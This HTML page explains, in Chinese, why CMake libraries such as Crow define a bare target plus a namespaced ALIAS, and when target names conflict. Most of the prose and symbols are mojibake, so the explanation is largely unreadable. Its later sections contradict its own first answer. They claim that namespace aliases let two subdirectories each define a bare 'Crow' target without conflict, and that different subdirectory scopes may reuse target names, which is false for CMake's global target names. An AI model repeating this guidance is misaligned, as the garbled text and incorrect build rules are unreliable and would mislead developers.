<p><strong>ç­”æ¡ˆï¼šæ˜¯çš„ï¼Œä¼šæš´éœ²ï¼ä½†è¿™æ˜¯ CMake çš„è®¾è®¡ï¼Œä¸æ˜¯ bugã€‚</strong></p>
<p><strong>å®é™…æƒ…å†µ</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># åº“æä¾›è€…ï¼ˆCrow é¡¹ç›®ï¼‰
add_library(Crow INTERFACE)                    # è£¸åå­—ç›®æ ‡
target_include_directories(Crow INTERFACE include/)  # åœ¨è£¸åå­—ä¸Šé…ç½®
add_library(Crow::Crow ALIAS Crow)            # åˆ›å»ºåˆ«å

# åº“ä½¿ç”¨è€…ï¼ˆä½ çš„é¡¹ç›®ï¼‰
target_link_libraries(myapp Crow)        # âœ… æŠ€æœ¯ä¸Šå¯ä»¥ï¼Œä½†ä¸æ¨è
target_link_libraries(myapp Crow::Crow)  # âœ… æ¨èä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li>
<p><strong>CMake ä¸ä¼šéšè—åŸç›®æ ‡</strong>ï¼š</p>
<ul>
<li><code>Crow</code> å’Œ <code>Crow::Crow</code> <strong>åŒæ—¶å­˜åœ¨</strong>ï¼Œéƒ½å¯ä»¥ä½¿ç”¨</li>
<li>è¿™ä¸æ˜¯"éšè—"ï¼Œè€Œæ˜¯"æä¾›ä¸¤ä¸ªåå­—"</li>
<li>ç”¨æˆ·æŠ€æœ¯ä¸Šå¯ä»¥ä½¿ç”¨ <code>Crow</code>ï¼Œä½†æœ€ä½³å®è·µæ˜¯ä½¿ç”¨ <code>Crow::Crow</code></li>
</ul>
</li>
<li>
<p><strong>è¿™æ˜¯å‘½åçº¦å®šï¼Œä¸æ˜¯çœŸæ­£çš„å°è£…</strong>ï¼š</p>
<ul>
<li>CMake æ²¡æœ‰çœŸæ­£çš„"ç§æœ‰"ç›®æ ‡æ¦‚å¿µ</li>
<li>å‘½åç©ºé—´æ˜¯<strong>çº¦å®š</strong>ï¼Œä¸æ˜¯<strong>å¼ºåˆ¶</strong></li>
<li>å°±åƒ C++ çš„å‘½åç©ºé—´ä¸€æ ·ï¼ŒæŠ€æœ¯ä¸Šå¯ä»¥ç»•è¿‡ï¼Œä½†éµå¾ªçº¦å®šæ›´å¥½</li>
</ul>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<p><strong>çµæ´»æ€§</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># é¡¹ç›®å†…éƒ¨å¯ä»¥ä½¿ç”¨è£¸åå­—ï¼ˆæ›´ç®€æ´ï¼‰
target_link_libraries(internal_lib Crow)  # âœ… å†…éƒ¨ä½¿ç”¨ï¼Œæ›´ç®€æ´

# å¯¹å¤–æ¥å£ä½¿ç”¨å‘½åç©ºé—´ï¼ˆæ›´è§„èŒƒï¼‰
target_link_libraries(public_api Crow::Crow)  # âœ… å…¬å…±æ¥å£ï¼Œæ›´æ¸…æ™°
</code></pre>
<p><strong>å‘åå…¼å®¹</strong>ï¼š</p>
<ul>
<li>å¦‚æœå®Œå…¨éšè—è£¸åå­—ï¼Œä¼šç ´åæ—§ä»£ç </li>
<li>å…è®¸ä¸¤ç§æ–¹å¼ï¼Œä¿æŒå…¼å®¹æ€§</li>
</ul>
<p><strong>å®é™…éœ€æ±‚</strong>ï¼š</p>
<ul>
<li>æœ‰äº›æ“ä½œï¼ˆå¦‚é…ç½®å±æ€§ï¼‰å¿…é¡»åœ¨è£¸åå­—ä¸Šå®Œæˆ</li>
<li>å¦‚æœå®Œå…¨éšè—ï¼Œè¿™äº›æ“ä½œå°±æ— æ³•è¿›è¡Œ</li>
</ul>
</li>
</ol>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<p>æŸ¥çœ‹ Crow é¡¹ç›®çš„å®é™…ä»£ç ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
add_library(Crow INTERFACE)  # è£¸åå­—ï¼Œç”¨äºé…ç½®
target_include_directories(Crow INTERFACE ...)  # åœ¨è£¸åå­—ä¸Šé…ç½®
target_link_libraries(Crow INTERFACE asio::asio)  # åœ¨è£¸åå­—ä¸Šé…ç½®

add_library(Crow::Crow ALIAS Crow)  # åˆ›å»ºåˆ«åï¼Œæä¾›å‘½åç©ºé—´ç‰ˆæœ¬
</code></pre>
<p>åœ¨ <code>examples/CMakeLists.txt</code> ä¸­ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ‰€æœ‰ç¤ºä¾‹éƒ½ä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬ï¼ˆæœ€ä½³å®è·µï¼‰
target_link_libraries(basic_example PUBLIC Crow::Crow)  # âœ… æ¨è

# æŠ€æœ¯ä¸Šä¹Ÿå¯ä»¥ä½¿ç”¨è£¸åå­—ï¼ˆä½†ä¸æ¨èï¼‰
# target_link_libraries(basic_example PUBLIC Crow)  # âš ï¸ ä¸æ¨èï¼Œä½†å¯ä»¥å·¥ä½œ
</code></pre>
<p><strong>å¯¹æ¯”å…¶ä»–è¯­è¨€</strong>ï¼š</p>
<p>è¿™å°±åƒ C++ çš„å‘½åç©ºé—´ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">namespace</span> crow {
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> { ... };
}

<span class="hljs-comment">// å¯ä»¥ä½¿ç”¨å®Œæ•´å‘½åç©ºé—´</span>
crow::App app;  <span class="hljs-comment">// âœ… æ¨è</span>

<span class="hljs-comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨ using å£°æ˜</span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> crow;
App app;  <span class="hljs-comment">// âš ï¸ æŠ€æœ¯ä¸Šå¯ä»¥ï¼Œä½†ä¸æ¨èï¼ˆå¯èƒ½å†²çªï¼‰</span>
</code></pre>
<p>CMake çš„å‘½åç©ºé—´ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼š</p>
<ul>
<li>æ¨èä½¿ç”¨ <code>Crow::Crow</code>ï¼ˆæ¸…æ™°ã€ä¸å†²çªï¼‰</li>
<li>æŠ€æœ¯ä¸Šå¯ä»¥ä½¿ç”¨ <code>Crow</code>ï¼ˆç®€æ´ï¼Œä½†å¯èƒ½å†²çªï¼‰</li>
<li>è¿™æ˜¯çº¦å®šï¼Œä¸æ˜¯å¼ºåˆ¶</li>
</ul>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ol>
<li><strong>åº“æä¾›è€…</strong>ï¼š
<ul>
<li>åˆ›å»ºè£¸åå­—ç›®æ ‡ç”¨äºé…ç½®</li>
<li>åˆ›å»ºå‘½åç©ºé—´åˆ«åç”¨äºå¯¹å¤–æ¥å£</li>
<li>æ–‡æ¡£ä¸­æ¨èä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬</li>
</ul>
</li>
<li><strong>åº“ä½¿ç”¨è€…</strong>ï¼š
<ul>
<li>æ€»æ˜¯ä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬ï¼ˆ<code>Crow::Crow</code>ï¼‰</li>
<li>é¿å…ä½¿ç”¨è£¸åå­—ï¼ˆ<code>Crow</code>ï¼‰ï¼Œé™¤éç¡®å®šä¸ä¼šå†²çª</li>
</ul>
</li>
</ol>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>âœ… <strong>ä¼šæš´éœ²</strong>ï¼šè£¸åå­—ç›®æ ‡ä»ç„¶å¯ç”¨</li>
<li>âœ… <strong>è¿™æ˜¯è®¾è®¡</strong>ï¼šCMake ä¸éšè—åŸç›®æ ‡ï¼Œæä¾›çµæ´»æ€§</li>
<li>âœ… <strong>è¿™æ˜¯çº¦å®š</strong>ï¼šå‘½åç©ºé—´æ˜¯çº¦å®šï¼Œä¸æ˜¯å¼ºåˆ¶å°è£…</li>
<li>âœ… <strong>æœ€ä½³å®è·µ</strong>ï¼šä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬ï¼Œé¿å…å†²çª</li>
<li>âš ï¸ <strong>æ³¨æ„</strong>ï¼šæŠ€æœ¯ä¸Šå¯ä»¥ä½¿ç”¨è£¸åå­—ï¼Œä½†éµå¾ªçº¦å®šæ›´å¥½</li>
</ul>
<p><strong>åŸå›  3ï¼šè®¾è®¡æ¸…æ™°æ€§</strong></p>
<p>åˆ†ç¦»å®é™…ç›®æ ‡å’Œåˆ«åï¼ŒèŒè´£æ›´æ¸…æ™°ï¼š</p>
<ul>
<li><strong>è£¸åå­—ç›®æ ‡</strong>ï¼ˆ<code>Crow</code>ï¼‰ï¼šè´Ÿè´£å®é™…çš„åº“é…ç½®å’Œå±æ€§è®¾ç½®</li>
<li><strong>å‘½åç©ºé—´åˆ«å</strong>ï¼ˆ<code>Crow::Crow</code>ï¼‰ï¼šè´Ÿè´£æä¾›ç»Ÿä¸€çš„å…¬å…±æ¥å£</li>
</ul>
<p><strong>åŸå›  4ï¼šå…¼å®¹æ€§å’Œçµæ´»æ€§</strong></p>
<p>è¿™ç§æ–¹å¼å¯ä»¥åŒæ—¶æ”¯æŒä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># é¡¹ç›®å†…éƒ¨å¯ä»¥ä½¿ç”¨è£¸åå­—ï¼ˆæ›´ç®€æ´ï¼‰
target_link_libraries(internal_lib Crow)  # âœ… å†…éƒ¨ä½¿ç”¨

# å¯¹å¤–æä¾›å‘½åç©ºé—´ç‰ˆæœ¬ï¼ˆæ›´è§„èŒƒï¼‰
target_link_libraries(public_api Crow::Crow)  # âœ… å…¬å…±æ¥å£
</code></pre>
<p><strong>å®é™…ä¾‹å­å¯¹æ¯”</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># âŒ é”™è¯¯æ–¹å¼ï¼šç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡
add_library(Crow::Crow INTERFACE)  # âš ï¸ CMake æ”¿ç­– CMP0037 ä¸å…è®¸
target_include_directories(Crow::Crow INTERFACE include/)  # âš ï¸ å¯èƒ½æŠ¥é”™æˆ–è­¦å‘Š

# âœ… æ­£ç¡®æ–¹å¼ï¼šå…ˆåˆ›å»ºè£¸åå­—ï¼Œå†åˆ›å»ºåˆ«å
add_library(Crow INTERFACE)
target_include_directories(Crow INTERFACE include/)  # âœ… åœ¨è£¸åå­—ä¸Šé…ç½®
add_library(Crow::Crow ALIAS Crow)  # âœ… åˆ›å»ºå‘½åç©ºé—´åˆ«å
</code></pre>
<p><strong>å…·ä½“é—®é¢˜è¯´æ˜</strong>ï¼š</p>
<ol>
<li><strong>CMake æ”¿ç­–é™åˆ¶ï¼ˆCMP0037ï¼‰</strong>ï¼š
<ul>
<li>CMake è§„å®šï¼šå¸¦ <code>::</code> çš„ç›®æ ‡å<strong>åªèƒ½ç”¨äº ALIAS æˆ– IMPORTED ç›®æ ‡</strong></li>
<li>æ™®é€šç›®æ ‡ï¼ˆå¦‚ <code>add_library(Crow::Crow INTERFACE)</code>ï¼‰ä¸èƒ½ç›´æ¥ä½¿ç”¨å¸¦ <code>::</code> çš„åå­—</li>
<li>å¦‚æœå¼ºåˆ¶ä½¿ç”¨ï¼ŒCMake å¯èƒ½ä¼šï¼š
<ul>
<li>æŠ¥é”™ï¼š<code>Target names may not contain a "::" unless it is an ALIAS or IMPORTED target</code></li>
<li>æˆ–è€…å‘å‡ºè­¦å‘Šï¼Œå–å†³äº CMake ç‰ˆæœ¬å’Œæ”¿ç­–è®¾ç½®</li>
</ul>
</li>
</ul>
</li>
<li><strong>è¡Œä¸ºä¸ç¡®å®š</strong>ï¼š
<ul>
<li>å³ä½¿æŸäº› CMake ç‰ˆæœ¬å…è®¸ï¼Œè¿™ç§è¡Œä¸ºä¹Ÿæ˜¯æœªå®šä¹‰çš„</li>
<li>å¯èƒ½å¯¼è‡´åç»­é…ç½®ã€å®‰è£…ã€å¯¼å‡ºæ—¶å‡ºç°é—®é¢˜</li>
<li>ä¸åŒ CMake ç‰ˆæœ¬å¯èƒ½æœ‰ä¸åŒçš„å¤„ç†æ–¹å¼</li>
</ul>
</li>
<li><strong>ä¸ç¬¦åˆæœ€ä½³å®è·µ</strong>ï¼š
<ul>
<li>ç°ä»£ CMake æ˜ç¡®è¦æ±‚ï¼šæ™®é€šç›®æ ‡ç”¨è£¸åå­—ï¼Œå‘½åç©ºé—´ç”¨ ALIAS</li>
<li>è¿åè¿™ä¸ªçº¦å®šå¯èƒ½å¯¼è‡´å·¥å…·é“¾ã€IDE æ”¯æŒä¸ä½³</li>
</ul>
</li>
</ol>
<p><strong>å®é™…æµ‹è¯•</strong>ï¼š</p>
<p>å¦‚æœä½ å°è¯•ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡ï¼ŒCMake é€šå¸¸ä¼šæŠ¥é”™ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">CMake <span class="hljs-keyword">Error</span>: Target names may <span class="hljs-built_in">not</span> contain a <span class="hljs-string">"::"</span> unless it <span class="hljs-built_in">is</span> an <span class="hljs-keyword">ALIAS</span> <span class="hljs-built_in">or</span> IMPORTED target.
</code></pre>
<p>æˆ–è€…åœ¨æŸäº›ç‰ˆæœ¬ä¸­ä¼šè­¦å‘Šï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-type">CMake</span> <span class="hljs-type">Warning</span>: <span class="hljs-type">Target</span> <span class="hljs-string">"Crow::Crow"</span> contains <span class="hljs-string">"::"</span> but <span class="hljs-keyword">is</span> not an <span class="hljs-type">ALIAS</span> or <span class="hljs-type">IMPORTED</span> target.
</code></pre>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>å¿…é¡»å…ˆç”¨è£¸åå­—åˆ›å»ºå®é™…ç›®æ ‡ï¼ˆå› ä¸ºè¦é…ç½®å±æ€§ï¼‰</li>
<li>ç„¶åç”¨ ALIAS åˆ›å»ºå‘½åç©ºé—´ç‰ˆæœ¬ï¼ˆæä¾›ç»Ÿä¸€æ¥å£ï¼‰</li>
<li>è¿™æ˜¯ CMake çš„è®¾è®¡ï¼Œä¹Ÿæ˜¯æœ€ä½³å®è·µ</li>
</ul>
<p><strong>å†å²åŸå› å’Œè®¾è®¡è€ƒé‡</strong>ï¼š</p>
<p>ä¸ºä»€ä¹ˆä¸ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡å‘¢ï¼Ÿ<strong>å¦‚æœå¯ä»¥ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡ï¼Œç¡®å®ä¼šæ›´æ¸…æ™°</strong>ï¼</p>
<pre><code class="hljs language-cmake" lang="cmake"># ç†æƒ³æƒ…å†µï¼ˆå¦‚æœ CMake æ”¯æŒï¼‰
add_library(Crow::Crow INTERFACE)  # ç›´æ¥åˆ›å»ºï¼Œä¸€æ­¥åˆ°ä½ï¼Œå¤šæ¸…æ™°ï¼
target_include_directories(Crow::Crow INTERFACE include/)
</code></pre>
<p>ä½†ç°å®æ˜¯ï¼ŒCMake çš„å†å²è®¾è®¡å¯¼è‡´äº†è¿™ç§"ä¸¤æ­¥èµ°"çš„æ–¹å¼ï¼š</p>
<p><strong>ä¸ºä»€ä¹ˆ CMake è¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<ol>
<li><strong>å†å²æ¼”è¿›</strong>ï¼š
<ul>
<li>CMake æ—©æœŸï¼ˆ2.x æ—¶ä»£ï¼‰æ²¡æœ‰å‘½åç©ºé—´æ¦‚å¿µ</li>
<li>ç›®æ ‡åå°±æ˜¯ç®€å•çš„å­—ç¬¦ä¸²ï¼Œæ²¡æœ‰ <code>::</code> çš„ç‰¹æ®Šå«ä¹‰</li>
<li>åæ¥å¼•å…¥å‘½åç©ºé—´æ—¶ï¼Œä¸ºäº†å‘åå…¼å®¹ï¼Œé‡‡ç”¨äº† ALIAS æœºåˆ¶</li>
</ul>
</li>
<li><strong>æŠ€æœ¯é™åˆ¶</strong>ï¼š
<ul>
<li>CMake çš„ç›®æ ‡ç³»ç»Ÿå»ºç«‹åœ¨å¯¹ç›®æ ‡åçš„å­—ç¬¦ä¸²åŒ¹é…ä¸Š</li>
<li>å¸¦ <code>::</code> çš„åå­—éœ€è¦ç‰¹æ®Šå¤„ç†ï¼ŒåŒºåˆ†"æ™®é€šç›®æ ‡"å’Œ"å‘½åç©ºé—´ç›®æ ‡"</li>
<li>ä¸ºäº†ä¿æŒç³»ç»Ÿä¸€è‡´æ€§ï¼Œé™åˆ¶æ™®é€šç›®æ ‡ä¸èƒ½ç›´æ¥ç”¨ <code>::</code></li>
</ul>
</li>
<li><strong>å‘åå…¼å®¹æ€§</strong>ï¼š
<ul>
<li>å¦‚æœå…è®¸æ™®é€šç›®æ ‡ç”¨ <code>::</code>ï¼Œä¼šç ´åå¤§é‡ç°æœ‰é¡¹ç›®</li>
<li>éœ€è¦åŒºåˆ†"æ—§å¼ç›®æ ‡"å’Œ"æ–°å¼å‘½åç©ºé—´ç›®æ ‡"</li>
<li>ALIAS æœºåˆ¶æä¾›äº†ä¸€ä¸ªå¹³æ»‘çš„è¿‡æ¸¡æ–¹æ¡ˆ</li>
</ul>
</li>
</ol>
<p><strong>å¦‚æœé‡æ–°è®¾è®¡ä¼šæ€æ ·ï¼Ÿ</strong></p>
<p>ç†è®ºä¸Šï¼Œå¦‚æœ CMake é‡æ–°è®¾è®¡ï¼Œå¯èƒ½ä¼šè¿™æ ·ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ç†æƒ³è®¾è®¡ï¼ˆå‡è®¾ï¼‰
add_library(Crow::Crow INTERFACE)  # ç›´æ¥åˆ›å»ºå‘½åç©ºé—´ç›®æ ‡
target_include_directories(Crow::Crow INTERFACE include/)
# ä¸éœ€è¦ ALIASï¼Œä¸€æ­¥åˆ°ä½
</code></pre>
<p>è¿™æ ·ç¡®å®æ›´æ¸…æ™°ï¼Œä½†ç°å®æ˜¯ï¼š</p>
<ul>
<li>CMake å·²ç»æ˜¯ä¸€ä¸ªæˆç†Ÿã€å¹¿æ³›ä½¿ç”¨çš„æ„å»ºç³»ç»Ÿ</li>
<li>æ”¹å˜è¿™ä¸ªè®¾è®¡ä¼šç ´åå¤§é‡ç°æœ‰é¡¹ç›®</li>
<li>æ‰€ä»¥åªèƒ½é€šè¿‡ ALIAS æœºåˆ¶æ¥"æ¨¡æ‹Ÿ"å‘½åç©ºé—´</li>
</ul>
<p><strong>ç±»æ¯”ç†è§£</strong>ï¼š</p>
<p>è¿™å°±åƒç¼–ç¨‹è¯­è¨€ä¸­çš„ä¸€äº›"å†å²åŒ…è¢±"ï¼š</p>
<ul>
<li>C++ çš„ <code>std::string</code> vs <code>string</code>ï¼ˆéœ€è¦ <code>using namespace std</code>ï¼‰</li>
<li>JavaScript çš„ <code>var</code> vs <code>let/const</code>ï¼ˆå†å²åŸå› å¯¼è‡´å¤šç§å£°æ˜æ–¹å¼ï¼‰</li>
<li>Python 2 vs Python 3ï¼ˆä¸ºäº†æ”¹è¿›ï¼Œä½†éœ€è¦å…¼å®¹æ€§è€ƒè™‘ï¼‰</li>
</ul>
<p><strong>å®é™…å½±å“</strong>ï¼š</p>
<p>è™½ç„¶è®¾è®¡ä¸Šä¸å¤Ÿç†æƒ³ï¼Œä½†å®é™…ä½¿ç”¨ä¸­ï¼š</p>
<ul>
<li>âœ… ä¸¤è¡Œä»£ç å°±èƒ½è§£å†³ï¼ˆ<code>add_library</code> + <code>add_library ALIAS</code>ï¼‰</li>
<li>âœ… å·²ç»æˆä¸ºæ ‡å‡†åšæ³•ï¼Œæ‰€æœ‰ç°ä»£ CMake é¡¹ç›®éƒ½è¿™æ ·ç”¨</li>
<li>âœ… å·¥å…·é“¾ã€IDE éƒ½å¾ˆå¥½åœ°æ”¯æŒè¿™ç§æ¨¡å¼</li>
<li>âš ï¸ ç¡®å®æœ‰ç‚¹"ç»•"ï¼Œä½†è¿™æ˜¯å†å²åŸå› ï¼Œä¸æ˜¯è®¾è®¡ç¼ºé™·</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼š</p>
<p><strong>ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡ç¡®å®æ›´æ¸…æ™°</strong>ã€‚ä½† CMake çš„å†å²è®¾è®¡å¯¼è‡´å¿…é¡»ç”¨"è£¸åå­— + ALIAS"çš„æ–¹å¼ã€‚è¿™æ˜¯æŠ€æœ¯å€ºåŠ¡ï¼Œä½†å·²ç»æˆä¸ºäº†äº‹å®æ ‡å‡†ã€‚ä½œä¸ºä½¿ç”¨è€…ï¼Œæˆ‘ä»¬åªèƒ½éµå¾ªè¿™ä¸ªçº¦å®šï¼Œè™½ç„¶å®ƒç¡®å®ä¸å¤Ÿä¼˜é›…ã€‚</p>
<p><strong>å¦‚æœä¸¤ä¸ªè£¸åå­—éƒ½å« <code>Crow</code>ï¼Œä¼šå†²çªå—ï¼Ÿ</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é—®é¢˜ï¼ç­”æ¡ˆæ˜¯ï¼š<strong>ä¼šå†²çªï¼ŒCMake ä¼šæŠ¥é”™</strong>ã€‚</p>
<p><strong>å†²çªåœºæ™¯ 1ï¼šåŒä¸€ä¸ªé¡¹ç›®ä¸­åˆ›å»ºä¸¤ä¸ªåŒåç›®æ ‡</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
add_library(Crow INTERFACE)  # ç¬¬ä¸€ä¸ª Crow
add_library(Crow STATIC crow.cpp)  # âŒ ç¬¬äºŒä¸ª Crowï¼Œä¼šæŠ¥é”™ï¼
</code></pre>
<p><strong>é”™è¯¯ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span>: add_library cannot create target <span class="hljs-string">"Crow"</span> because another
target <span class="hljs-keyword">with</span> the same name already exists.
</code></pre>
<p><strong>å†²çªåœºæ™¯ 2ï¼šé€šè¿‡ add_subdirectory å¼•å…¥åŒåç›®æ ‡</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># ä¸»é¡¹ç›® CMakeLists.txt
add_library(Crow INTERFACE)
add_subdirectory(third_party/Crow)  # å­é¡¹ç›®ä¹Ÿåˆ›å»ºäº† Crow
</code></pre>
<p>å¦‚æœå­é¡¹ç›®çš„ <code>CMakeLists.txt</code> ä¹Ÿåˆ›å»ºäº† <code>Crow</code> ç›®æ ‡ï¼Œä¼šå†²çªï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span>: add_library cannot create target <span class="hljs-string">"Crow"</span> because another
target <span class="hljs-keyword">with</span> the same name already exists.
</code></pre>
<p><strong>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦å‘½åç©ºé—´ï¼</strong></p>
<p>ä½¿ç”¨å‘½åç©ºé—´å¯ä»¥é¿å…å†²çªï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä¸»é¡¹ç›®
add_library(MyCrow INTERFACE)
add_library(MyCrow::MyCrow ALIAS MyCrow)

# å­é¡¹ç›®ï¼ˆç¬¬ä¸‰æ–¹ Crowï¼‰
add_subdirectory(third_party/Crow)  # å†…éƒ¨åˆ›å»º Crow å’Œåˆ«åCrow::Crow

# ç°åœ¨å¯ä»¥åŒæ—¶ä½¿ç”¨ï¼Œä¸ä¼šå†²çªï¼
target_link_libraries(myapp 
    MyCrow::MyCrow    # âœ… ä¸»é¡¹ç›®çš„ Crow
    Crow::Crow        # âœ… ç¬¬ä¸‰æ–¹ Crow
)
</code></pre>
<p><strong>å‘½åç©ºé—´å¦‚ä½•é¿å…å†²çªï¼Ÿ</strong></p>
<p>å‘½åç©ºé—´å‰ç¼€è®©ç›®æ ‡åå˜å¾—å”¯ä¸€ï¼š</p>



































<table><thead><tr><th>åœºæ™¯</th><th>è£¸åå­—</th><th>å‘½åç©ºé—´ç‰ˆæœ¬</th><th>æ˜¯å¦å†²çªï¼Ÿ</th></tr></thead><tbody><tr><td>åŒä¸€ä¸ªé¡¹ç›®</td><td><code>Crow</code></td><td><code>Crow::Crow</code></td><td>âœ… ä¸å†²çªï¼ˆä¸åŒåå­—ï¼‰</td></tr><tr><td>ä¸åŒé¡¹ç›®</td><td><code>Crow</code></td><td><code>Crow::Crow</code></td><td>âœ… ä¸å†²çªï¼ˆä¸åŒåå­—ï¼‰</td></tr><tr><td>ä¸¤ä¸ª <code>Crow</code></td><td><code>Crow</code> vs <code>Crow</code></td><td>-</td><td>âŒ å†²çªï¼</td></tr><tr><td>ä¸¤ä¸ªå‘½åç©ºé—´</td><td><code>Crow::Crow</code> vs <code>MyCrow::Crow</code></td><td>-</td><td>âœ… ä¸å†²çªï¼ˆä¸åŒåå­—ï¼‰</td></tr></tbody></table>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<p>å‡è®¾ä½ çš„é¡¹ç›®åŒæ—¶ä½¿ç”¨ä¸¤ä¸ªå­ç›®å½•çš„åº“ï¼Œå®ƒä»¬å†…éƒ¨éƒ½åˆ›å»ºäº† <code>Crow</code> ç›®æ ‡ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä½ çš„é¡¹ç›®
add_subdirectory(libA)  # libA å†…éƒ¨ï¼šadd_library(Crow INTERFACE)
add_subdirectory(libB)  # libB å†…éƒ¨ï¼šadd_library(Crow INTERFACE)
# âŒ å†²çªï¼ä¸¤ä¸ª Crow ç›®æ ‡
</code></pre>
<p>ä½†å¦‚æœå®ƒä»¬éƒ½ä½¿ç”¨å‘½åç©ºé—´ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä½ çš„é¡¹ç›®
add_subdirectory(libA)  # libA: add_library(Crow INTERFACE)
                        #      add_library(LibA::Crow ALIAS Crow)
add_subdirectory(libB)  # libB: add_library(Crow INTERFACE)
                        #      add_library(LibB::Crow ALIAS Crow)

# âœ… ä¸å†²çªï¼å› ä¸ºå‘½åç©ºé—´ä¸åŒ
target_link_libraries(myapp
    LibA::Crow   # âœ… æ¥è‡ª libA
    LibB::Crow   # âœ… æ¥è‡ª libB
)
</code></pre>
<p>è™½ç„¶å†…éƒ¨éƒ½æœ‰ <code>Crow</code> è£¸åå­—ç›®æ ‡ï¼Œä½†ï¼š</p>
<ul>
<li>å®ƒä»¬åœ¨ä¸åŒçš„ä½œç”¨åŸŸä¸­ï¼ˆä¸åŒçš„ <code>add_subdirectory</code>ï¼Œåœ¨å„è‡ªç›®å½•ä¸‹æ˜¯å”¯ä¸€çš„ï¼‰</li>
<li>é€šè¿‡å‘½åç©ºé—´åˆ«å <code>LibA::Crow</code> å’Œ <code>LibB::Crow</code> åŒºåˆ†</li>
<li>ä¸ä¼šå†²çª</li>
</ul>
<p><strong>ä½œç”¨åŸŸè§„åˆ™</strong>ï¼š</p>
<p>CMake çš„ç›®æ ‡ä½œç”¨åŸŸï¼š</p>
<ul>
<li>åœ¨åŒä¸€ä¸ª <code>add_subdirectory</code> ä½œç”¨åŸŸå†…ï¼Œç›®æ ‡åå¿…é¡»å”¯ä¸€</li>
<li>ä¸åŒä½œç”¨åŸŸå¯ä»¥æœ‰åŒåç›®æ ‡ï¼ˆä½†é€šè¿‡å‘½åç©ºé—´åŒºåˆ†æ›´æ¸…æ™°ï¼‰</li>
<li>å…¨å±€ä½œç”¨åŸŸï¼ˆæ ¹ CMakeLists.txtï¼‰çš„ç›®æ ‡åœ¨æ•´ä¸ªé¡¹ç›®å¯è§</li>
</ul>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ€»æ˜¯ä½¿ç”¨å‘½åç©ºé—´åˆ«å</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)  # âœ… æä¾›å‘½åç©ºé—´ç‰ˆæœ¬
</code></pre>
</li>
<li>
<p><strong>å¯¹å¤–æ¥å£ä½¿ç”¨å‘½åç©ºé—´</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># å¯¹å¤–æä¾›å‘½åç©ºé—´ç‰ˆæœ¬
target_link_libraries(public_api Crow::Crow)  # âœ… æ¸…æ™°ã€ä¸å†²çª
</code></pre>
</li>
<li>
<p><strong>å†…éƒ¨å¯ä»¥ä½¿ç”¨è£¸åå­—</strong>ï¼ˆå¦‚æœç¡®å®šä¸ä¼šå†²çªï¼‰ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># å†…éƒ¨ä½¿ç”¨ï¼ˆå¦‚æœç¡®å®šå”¯ä¸€ï¼‰
target_link_libraries(internal_lib Crow)  # âš ï¸ è°¨æ…ä½¿ç”¨
</code></pre>
</li>
</ol>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>âœ… <strong>ä¼šå†²çª</strong>ï¼šåŒä¸€ä¸ªä½œç”¨åŸŸå†…ä¸¤ä¸ªåŒåè£¸åå­—ç›®æ ‡ä¼šå†²çª</li>
<li>âœ… <strong>å‘½åç©ºé—´é¿å…å†²çª</strong>ï¼š<code>Crow::Crow</code> å’Œ <code>MyCrow::Crow</code> æ˜¯ä¸åŒçš„åå­—ï¼Œä¸å†²çª</li>
